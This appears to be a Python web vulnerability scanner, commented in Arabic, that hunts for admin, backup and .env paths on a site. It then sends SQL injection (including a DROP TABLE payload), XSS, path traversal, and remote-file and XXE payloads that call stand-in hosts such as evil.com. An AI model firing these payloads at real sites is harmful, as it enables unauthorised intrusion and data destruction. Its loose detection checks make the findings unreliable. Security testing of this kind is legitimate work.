#!/usr/bin/env python3
"""
ماسح الروابط المستهدفة الخفية وفحصها للثغرات الأمنية
Hidden Links Scanner & Vulnerability Assessment Tool
"""

import requests
import re
import json
import time
import hashlib
import random
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import logging

# تعطيل التحذيرات SSL
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class HiddenLinksScanner:
    """
    أداة متخصصة لاكتشاف الروابط المستهدفة الخفية في المواقع
    وفحصها للثغرات الأمنية المختلفة
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.session.verify = False
        self.session.timeout = 10
        
        # أنماط الثغرات الأمنية
        self.vulnerability_patterns = {
            'sql_injection': {
                'patterns': [
                    r"(\?|&)([^&=]+)=([^&]*)'",
                    r"(\?|&)([^&=]+)=([^&]*)\"",
                    r"(\?|&)([^&=]+)=([^&]*)(union|select|insert|update|delete|drop)",
                    r"(\?|&)([^&=]+)=([^&]*)(and|or)\s+\d+\s*=\s*\d+",
                    r"(\?|&)([^&=]+)=([^&]*)(and|or)\s+['\"][^'\"]*['\"]\s*=\s*['\"][^'\"]*['\"]"
                ],
                'payloads': [
                    "' OR 1=1--",
                    "' UNION SELECT 1,2,3--",
                    "' AND 1=CONVERT(int, (SELECT @@version))--",
                    "'; DROP TABLE users;--"
                ],
                'severity': 'HIGH',
                'description': 'ثغرة حقن SQL قد تؤدي إلى الوصول غير المصرح به للبيانات'
            },
            
            'xss': {
                'patterns': [
                    r"(\?|&)([^&=]+)=([^&]*)(script|javascript|vbscript|onload|onerror)",
                    r"(\?|&)([^&=]+)=([^&]*)(<script|<img|<iframe|<object)",
                    r"(\?|&)([^&=]+)=([^&]*)(alert|confirm|prompt|document\.write)",
                    r"(\?|&)([^&=]+)=([^&]*)(javascript:|on\w+\s*=)",
                    r"(\?|&)([^&=]+)=([^&]*)(<svg|<math|xmlns)"
                ],
                'payloads': [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror=alert("XSS")>',
                    'javascript:alert("XSS")',
                    '<svg onload=alert("XSS")>'
                ],
                'severity': 'MEDIUM',
                'description': 'ثغرة XSS قد تؤدي إلى تنفيذ أكواد خبيثة في المتصفح'
            },
            
            'lfi': {
                'patterns': [
                    r"(\?|&)([^&=]+)=([^&]*)(\.\.\/|\.\.\\)",
                    r"(\?|&)([^&=]+)=([^&]*)(\/etc\/passwd|\/windows\/system32)",
                    r"(\?|&)([^&=]+)=([^&]*)(file:|php:|zip:|data:)",
                    r"(\?|&)([^&=]+)=([^&]*)(\.\.\/\.\.\/\.\.\/)"
                ],
                'payloads': [
                    '../../../etc/passwd',
                    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                    '....//....//....//etc/passwd',
                    'php://filter/read=convert.base64-encode/resource=config.php'
                ],
                'severity': 'HIGH',
                'description': 'ثغرة تضمين ملفات محلية قد تؤدي إلى الوصول للملفات الحساسة'
            },
            
            'rfi': {
                'patterns': [
                    r"(\?|&)([^&=]+)=([^&]*)(http://|https://|ftp://)",
                    r"(\?|&)([^&=]+)=([^&]*)(include|require)",
                    r"(\?|&)([^&=]+)=([^&]*)(allow_url_include|allow_url_fopen)"
                ],
                'payloads': [
                    'http://evil.com/shell.txt',
                    'https://malicious.com/backdoor.php',
                    'ftp://attacker.com/exploit.txt'
                ],
                'severity': 'CRITICAL',
                'description': 'ثغرة تضمين ملفات عن بُعد قد تؤدي إلى تنفيذ أوامر عن بُعد'
            },
            
            'idor': {
                'patterns': [
                    r"(\?|&)(id|user|uid|userid|user_id|account|profile)=\d+",
                    r"(\?|&)([^&=]+)=\d{1,6}",
                    r"(\?|&)([^&=]+)=(admin|root|test|guest|demo)"
                ],
                'payloads': [
                    '1', '2', '3', '9999', 'admin', 'root', 'test'
                ],
                'severity': 'MEDIUM',
                'description': 'ثغرة الوصول المباشر للكائنات قد تؤدي إلى الوصول لبيانات المستخدمين الآخرين'
            },
            
            'xxe': {
                'patterns': [
                    r"(\?|&)([^&=]+)=([^&]*)(<!ENTITY|<!DOCTYPE)",
                    r"(\?|&)([^&=]+)=([^&]*)(SYSTEM|PUBLIC)",
                    r"(\?|&)([^&=]+)=([^&]*)(file://|http://)"
                ],
                'payloads': [
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                    '<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">',
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=config.php">]>'
                ],
                'severity': 'HIGH',
                'description': 'ثغرة XML External Entity قد تؤدي إلى الوصول للملفات الحساسة'
            }
        }
        
        # أنماط الروابط المستهدفة الخفية
        self.hidden_link_patterns = [
            r'href=["\']([^"\']*admin[^"\']*)["\']',
            r'href=["\']([^"\']*backup[^"\']*)["\']',
            r'href=["\']([^"\']*config[^"\']*)["\']',
            r'href=["\']([^"\']*\.git[^"\']*)["\']',
            r'href=["\']([^"\']*\.env[^"\']*)["\']',
            r'href=["\']([^"\']*phpmyadmin[^"\']*)["\']',
            r'src=["\']([^"\']*admin[^"\']*)["\']',
            r'action=["\']([^"\']*login[^"\']*)["\']',
            r'data-url=["\']([^"\']*api[^"\']*)["\']',
            r'onclick=["\'][^"\']*location\.href=["\']([^"\']+)["\']'
        ]

    def find_hidden_links(self, target_url):
        """
        اكتشاف الروابط المستهدفة الخفية في الموقع
        """
        hidden_links = []
        
        try:
            response = self.session.get(target_url)
            response.raise_for_status()
            
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # 1. البحث في عناصر HTML
            sources = ['href', 'src', 'action', 'data-url', 'data-href', 'longdesc']
            
            for element in soup.find_all(True):
                for source in sources:
                    value = element.get(source)
                    if value and self._is_hidden_link(value, target_url):
                        hidden_links.append({
                            'url': urljoin(target_url, value),
                            'source': source,
                            'element': element.name,
                            'text': element.get_text(strip=True)[:100],
                            'hidden': self._is_hidden_element(element),
                            'context': 'html_element'
                        })
            
            # 2. البحث في JavaScript
            scripts = soup.find_all('script')
            for script in scripts:
                if script.string:
                    js_links = self._extract_js_links(script.string, target_url)
                    hidden_links.extend(js_links)
            
            # 3. البحث في CSS
            styles = soup.find_all('style')
            for style in styles:
                if style.string:
                    css_links = self._extract_css_links(style.string, target_url)
                    hidden_links.extend(css_links)
            
            # 4. البحث في التعليقات
            comments = soup.find_all(string=lambda text: isinstance(text, str))
            for comment in comments:
                if '<!--' in str(comment):
                    comment_links = self._extract_comment_links(str(comment), target_url)
                    hidden_links.extend(comment_links)
            
            # 5. البحث في Meta tags
            meta_tags = soup.find_all('meta')
            for meta in meta_tags:
                if meta.get('http-equiv') == 'refresh' and meta.get('content'):
                    url = self._extract_meta_refresh(meta.get('content'), target_url)
                    if url:
                        hidden_links.append({
                            'url': url,
                            'source': 'meta-refresh',
                            'element': 'meta',
                            'text': 'Meta redirect',
                            'hidden': True,
                            'context': 'meta_tag'
                        })
            
            # 6. البحث في robots.txt
            robots_links = self._check_robots_txt(target_url)
            hidden_links.extend(robots_links)
            
            # 7. البحث في sitemap.xml
            sitemap_links = self._check_sitemap_xml(target_url)
            hidden_links.extend(sitemap_links)
            
            # إزالة التكرارات
            seen = set()
            unique_links = []
            for link in hidden_links:
                if link['url'] not in seen:
                    seen.add(link['url'])
                    unique_links.append(link)
            
            return unique_links
            
        except Exception as e:
            logging.error(f"خطأ في اكتشاف الروابط الخفية: {e}")
            return []

    def _is_hidden_link(self, url, base_url):
        """تحديد إذا كانت الرابط مخفي أو مشبوه"""
        if not url or url.startswith('#') or url.startswith('mailto:'):
            return False
            
        parsed = urlparse(url)
        base_parsed = urlparse(base_url)
        
        # التحقق من أن الرابط داخل نفس النطاق
        if parsed.netloc and parsed.netloc != base_parsed.netloc:
            return False
            
        # أنماط الروابط المشبوهة
        suspicious_patterns = [
            r'admin', r'backup', r'config', r'test', r'dev', r'staging',
            r'\.git', r'\.env', r'\.htaccess', r'\.htpasswd',
            r'\.sql', r'\.bak', r'\.old', r'\.tmp', r'\.log',
            r'phpmyadmin', r'wp-admin', r'wp-config', r'wp-login',
            r'robots\.txt', r'sitemap', r'\.svn', r'\.hg',
            r'api/v\d+', r'rest/', r'graphql', r'soap',
            r'login', r'signin', r'auth', r'oauth', r'session',
            r'upload', r'files', r'download', r'backup',
            r'database', r'db_', r'sql', r'mysql'
        ]
        
        url_lower = url.lower()
        return any(re.search(pattern, url_lower) for pattern in suspicious_patterns)

    def _is_hidden_element(self, element):
        """التحقق إذا كان العنصر مخفي"""
        style = element.get('style', '').lower()
        classes = element.get('class', [])
        
        hidden_indicators = [
            'display:none', 'visibility:hidden', 'opacity:0',
            'hidden', 'invisible', 'screen-reader', 'sr-only',
            'position:absolute;left:-', 'text-indent:-'
        ]
        
        return any(indicator in style for indicator in hidden_indicators) or \
               any(indicator in str(classes).lower() for indicator in hidden_indicators)

    def _extract_js_links(self, js_content, base_url):
        """استخراج الروابط من JavaScript"""
        links = []
        
        patterns = [
            r'["\']([^"\']*\.(?:php|asp|jsp|html|js|json))["\']',
            r'["\']([^"\']*(?:admin|config|backup|test|api)[^"\']*)["\']',
            r'location\.href\s*=\s*["\']([^"\']+)["\']',
            r'window\.open\s*\(\s*["\']([^"\']+)["\']',
            r'\.load\s*\(\s*["\']([^"\']+)["\']',
            r'\.ajax\s*\(\s*{[^}]*url\s*:\s*["\']([^"\']+)["\']',
            r'fetch\s*\(\s*["\']([^"\']+)["\']',
            r'XMLHttpRequest\s*\(\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            for match in matches:
                if match and not match.startswith('http'):
                    full_url = urljoin(base_url, match)
                    links.append({
                        'url': full_url,
                        'source': 'javascript',
                        'element': 'script',
                        'text': f'JS: {match[:50]}',
                        'hidden': True,
                        'context': 'javascript'
                    })
        
        return links

    def _extract_css_links(self, css_content, base_url):
        """استخراج الروابط من CSS"""
        links = []
        
        patterns = [
            r'url\s*\(\s*["\']?([^"\')]+)["\']?\s*\)',
            r'@import\s+["\']([^"\']+)["\']',
            r'@import\s+url\s*\(\s*["\']([^"\']+)["\']\s*\)'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, css_content, re.IGNORECASE)
            for match in matches:
                if match and not match.startswith('http'):
                    full_url = urljoin(base_url, match)
                    links.append({
                        'url': full_url,
                        'source': 'css',
                        'element': 'style',
                        'text': f'CSS: {match[:50]}',
                        'hidden': True,
                        'context': 'css'
                    })
        
        return links

    def _extract_comment_links(self, comment, base_url):
        """استخراج الروابط من التعليقات"""
        links = []
        
        url_pattern = r'(https?://[^\s<>"]+|/[^\s<>"]+)'
        matches = re.findall(url_pattern, comment)
        
        for match in matches:
            if not match.startswith('http'):
                full_url = urljoin(base_url, match)
            else:
                full_url = match
                
            links.append({
                'url': full_url,
                'source': 'comment',
                'element': 'comment',
                'text': f'Comment: {match[:50]}',
                'hidden': True,
                'context': 'comment'
            })
        
        return links

    def _extract_meta_refresh(self, content, base_url):
        """استخراج URL من meta refresh"""
        pattern = r'\d+;url=([^"\']+)'
        match = re.search(pattern, content, re.IGNORECASE)
        if match:
            return urljoin(base_url, match.group(1))
        return None

    def _check_robots_txt(self, base_url):
        """التحقق من ملف robots.txt للروابط المخفية"""
        links = []
        
        try:
            robots_url = urljoin(base_url, '/robots.txt')
            response = self.session.get(robots_url)
            
            if response.status_code == 200:
                # استخراج المسارات من robots.txt
                paths = re.findall(r'Disallow:\s*([^\s]+)', response.text, re.IGNORECASE)
                for path in paths:
                    full_url = urljoin(base_url, path)
                    links.append({
                        'url': full_url,
                        'source': 'robots.txt',
                        'element': 'robots',
                        'text': f'Robots: {path}',
                        'hidden': True,
                        'context': 'robots_txt'
                    })
        except Exception as e:
            logging.error(f"خطأ في قراءة robots.txt: {e}")
        
        return links

    def _check_sitemap_xml(self, base_url):
        """التحقق من ملف sitemap.xml للروابط"""
        links = []
        
        try:
            sitemap_url = urljoin(base_url, '/sitemap.xml')
            response = self.session.get(sitemap_url)
            
            if response.status_code == 200:
                # استخراج الروابط من sitemap
                urls = re.findall(r'<loc>([^<]+)</loc>', response.text)
                for url in urls:
                    if self._is_hidden_link(url, base_url):
                        links.append({
                            'url': url,
                            'source': 'sitemap.xml',
                            'element': 'sitemap',
                            'text': f'Sitemap: {url}',
                            'hidden': False,
                            'context': 'sitemap_xml'
                        })
        except Exception as e:
            logging.error(f"خطأ في قراءة sitemap.xml: {e}")
        
        return links

    def scan_vulnerabilities(self, hidden_links):
        """
        فحص الروابط الخفية للثغرات الأمنية
        """
        vulnerabilities = []
        
        def scan_link(link_info):
            try:
                url = link_info['url']
                
                # فحص كل نوع من الثغرات
                for vuln_type, vuln_config in self.vulnerability_patterns.items():
                    # فحص الأنماط في URL
                    for pattern in vuln_config['patterns']:
                        if re.search(pattern, url, re.IGNORECASE):
                            vulnerabilities.append({
                                'url': url,
                                'vulnerability_type': vuln_type,
                                'severity': vuln_config['severity'],
                                'description': vuln_config['description'],
                                'pattern': pattern,
                                'source': link_info['source'],
                                'hidden': link_info['hidden'],
                                'context': link_info.get('context', 'unknown'),
                                'timestamp': datetime.now().isoformat()
                            })
                    
                    # فحص الحمولات
                    for payload in vuln_config['payloads']:
                        test_url = self._create_test_url(url, payload)
                        if test_url:
                            try:
                                response = self.session.get(test_url, timeout=5)
                                if self._check_vulnerability_response(response, vuln_type):
                                    vulnerabilities.append({
                                        'url': test_url,
                                        'vulnerability_type': vuln_type,
                                        'severity': vuln_config['severity'],
                                        'description': vuln_config['description'],
                                        'payload': payload,
                                        'source': link_info['source'],
                                        'hidden': link_info['hidden'],
                                        'context': link_info.get('context', 'unknown'),
                                        'timestamp': datetime.now().isoformat(),
                                        'evidence': self._extract_evidence(response, vuln_type)
                                    })
                            except:
                                pass
                                
            except Exception as e:
                logging.error(f"خطأ في فحص الرابط {link_info['url']}: {e}")
        
        # فحص متعدد الخيوط
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(scan_link, hidden_links)
        
        return vulnerabilities

    def _create_test_url(self, base_url, payload):
        """إنشاء URL للاختبار"""
        parsed = urlparse(base_url)
        
        if parsed.query:
            # إضافة الحمولة إلى معامل موجود
            params = parse_qs(parsed.query)
            if params:
                key = list(params.keys())[0]
                new_query = f"{key}={payload}"
                return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        else:
            # إضافة معامل جديد
            return f"{base_url}?test={payload}"
        
        return None

    def _check_vulnerability_response(self, response, vuln_type):
        """التحقق من استجابة الثغرة"""
        if not response:
            return False
            
        content = response.text.lower()
        
        indicators = {
            'sql_injection': [
                'mysql_fetch_array', 'pg_query', 'sqlite_query', 'ora-',
                'microsoft ole db provider', 'odbc drivers error',
                'supplied argument is not a valid', 'sql syntax'
            ],
            'xss': [
                '<script>alert', 'javascript:alert', 'onload=alert',
                'onerror=alert', 'onclick=alert', 'confirm(' , 'prompt('
            ],
            'lfi': [
                'root:', 'daemon:', 'bin:', 'sys:',
                'windows\\system32', 'boot.ini', 'win.ini'
            ],
            'rfi': [
                'shell_exec', 'system(', 'exec(', 'passthru(',
                'include(', 'require(', 'eval('
            ],
            'idor': [
                'user_id', 'account_id', 'profile_id', 'admin'
            ],
            'xxe': [
                'file://', 'http://', 'system entity',
                'external entity', 'xml parsing error'
            ]
        }
        
        return any(indicator.lower() in content for indicator in indicators.get(vuln_type, []))

    def _extract_evidence(self, response, vuln_type):
        """استخراج الأدلة من الاستجابة"""
        if not response:
            return []
            
        content = response.text
        evidence = []
        
        # استخراج الأسطر التي تحتوي على أدلة
        lines = content.split('\n')
        for line in lines:
            line_lower = line.lower()
            
            if vuln_type == 'sql_injection' and any(indicator in line_lower for indicator in ['sql', 'mysql', 'postgresql']):
                evidence.append(line.strip()[:200])
            elif vuln_type == 'xss' and any(indicator in line_lower for indicator in ['script', 'alert', 'javascript']):
                evidence.append(line.strip()[:200])
            elif vuln_type == 'lfi' and any(indicator in line_lower for indicator in ['root:', 'windows', 'etc/passwd']):
                evidence.append(line.strip()[:200])
        
        return evidence

    def generate_comprehensive_report(self, target_url):
        """
        توليد تقرير شامل عن الروابط الخفية والثغرات
        """
        print(f"🕵️ بدء فحص الروابط الخفية لـ: {target_url}")
        
        # اكتشاف الروابط الخفية
        hidden_links = self.find_hidden_links(target_url)
        
        if not hidden_links:
            return {
                'target_url': target_url,
                'scan_timestamp': datetime.now().isoformat(),
                'summary': {
                    'total_hidden_links': 0,
                    'vulnerable_links': 0,
                    'total_vulnerabilities': 0,
                    'risk_level': 'LOW',
                    'message': 'لم يتم العثور على روابط خفية'
                },
                'hidden_links': [],
                'vulnerabilities': [],
                'recommendations': ['الموقع نظيف من الروابط الخفية المشبوهة']
            }
        
        # فحص الروابط للثغرات
        vulnerabilities = self.scan_vulnerabilities(hidden_links)
        
        # تجميع الإحصائيات
        total_links = len(hidden_links)
        vulnerable_links = len(set(v['url'] for v in vulnerabilities))
        total_vulnerabilities = len(vulnerabilities)
        
        # تجميع حسب النوع
        vulnerability_types = {}
        for vuln in vulnerabilities:
            vuln_type = vuln['vulnerability_type']
            if vuln_type not in vulnerability_types:
                vulnerability_types[vuln_type] = {
                    'count': 0,
                    'severity': vuln['severity'],
                    'urls': []
                }
            vulnerability_types[vuln_type]['count'] += 1
            vulnerability_types[vuln_type]['urls'].append(vuln['url'])
        
        # تحديد مستوى الخطورة العام
        risk_level = self._calculate_risk_level(total_vulnerabilities, vulnerable_links)
        
        # توليد التوصيات
        recommendations = self._generate_recommendations(vulnerability_types)
        
        return {
            'target_url': target_url,
            'scan_timestamp': datetime.now().isoformat(),
            'summary': {
                'total_hidden_links': total_links,
                'vulnerable_links': vulnerable_links,
                'total_vulnerabilities': total_vulnerabilities,
                'risk_level': risk_level,
                'vulnerability_types': vulnerability_types
            },
            'hidden_links': hidden_links,
            'vulnerabilities': vulnerabilities,
            'recommendations': recommendations,
            'scan_metadata': {
                'scanner_version': '1.0.0',
                'scan_duration': 'auto',
                'user_agent': self.session.headers.get('User-Agent')
            }
        }

    def _calculate_risk_level(self, total_vulns, vulnerable_links):
        """حساب مستوى المخاطرة"""
        if total_vulns == 0:
            return 'LOW'
        elif total_vulns <= 3:
            return 'MEDIUM'
        elif total_vulns <= 10:
            return 'HIGH'
        else:
            return 'CRITICAL'

    def _generate_recommendations(self, vulnerability_types):
        """توليد توصيات أمنية"""
        recommendations = []
        
        if 'sql_injection' in vulnerability_types:
            recommendations.extend([
                "⚠️  استخدم معاملات SQL محضرة (prepared statements)",
                "🔍 تحقق من صحة جميع مدخلات المستخدم",
                "🛡️  قم بتطبيق WAF (Web Application Firewall)"
            ])
        
        if 'xss' in vulnerability_types:
            recommendations.extend([
                "⚠️  قم بتعقيم جميع مدخلات المستخدم",
                "🛡️  استخدم Content Security Policy (CSP)",
                "🔍 قم بترميز المخرجات HTML"
            ])
        
        if 'lfi' in vulnerability_types or 'rfi' in vulnerability_types:
            recommendations.extend([
                "⚠️  لا تسمح بإدخال مسارات الملفات من المستخدم",
                "🛡️  استخدم قائمة بيضاء للملفات المسموح بها",
                "🔍 قم بتعطيل allow_url_include في PHP"
            ])
        
        if 'idor' in vulnerability_types:
            recommendations.extend([
                "⚠️  تحقق من صلاحيات المستخدم قبل الوصول للموارد",
                "🛡️  استخدم معرفات غير متوقعة (UUIDs)",
                "🔍 قم بالتحقق من دور المستخدم في كل طلب"
            ])
        
        if not recommendations:
            recommendations.extend([
                "✅ لا توجد ثغرات حرجة تم اكتشافها",
                "🔍 تابع المراقبة الدورية للأمان",
                "📋 قم بإجراء فحص أمني دوري"
            ])
        
        return recommendations

    def export_report(self, report, filename=None):
        """تصدير التقرير إلى ملف JSON"""
        if not filename:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"hidden_links_report_{timestamp}.json"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(report, f, ensure_ascii=False, indent=2)
            print(f"✅ تم حفظ التقرير في: {filename}")
            return filename
        except Exception as e:
            print(f"❌ خطأ في حفظ التقرير: {e}")
            return None

# مثال على الاستخدام
if __name__ == "__main__":
    scanner = HiddenLinksScanner()
    
    # اختبار على موقع وهمي
    target_url = "https://example.com"
    
    # تشغيل الفحص
    report = scanner.generate_comprehensive_report(target_url)
    
    # عرض النتائج
    print("\n" + "="*60)
    print("📊 تقرير الروابط الخفية والثغرات")
    print("="*60)
    
    summary = report['summary']
    print(f"🔗 الروابط الخفية المكتشفة: {summary['total_hidden_links']}")
    print(f"⚠️  الروابط المعرضة للخطر: {summary['vulnerable_links']}")
    print(f"🔍 إجمالي الثغرات: {summary['total_vulnerabilities']}")
    print(f"📊 مستوى الخطورة: {summary['risk_level']}")
    
    if report['vulnerabilities']:
        print("\n🚨 الثغرات المكتشفة:")
        for vuln in report['vulnerabilities']:
            print(f"   • {vuln['vulnerability_type']} - {vuln['severity']}: {vuln['url']}")
    
    print("\n💡 التوصيات:")
    for rec in report['recommendations']:
        print(f"   • {rec}")
    
    # حفظ التقرير
    scanner.export_report(report)